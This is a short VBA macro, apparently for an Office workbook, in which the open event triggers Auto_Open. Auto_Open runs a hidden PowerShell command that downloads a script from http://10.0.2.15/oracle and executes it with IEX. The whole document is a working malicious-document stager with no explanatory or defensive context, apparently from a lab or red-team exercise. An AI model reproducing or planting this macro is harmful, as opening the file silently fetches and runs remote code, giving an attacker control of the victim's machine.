Sub WorkBook_Open()
Auto_Open
End Sub
Sub Auto_Open()
Dim str As String
str = "cmd /c powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.15:80/oracle');"
Shell str
End Sub
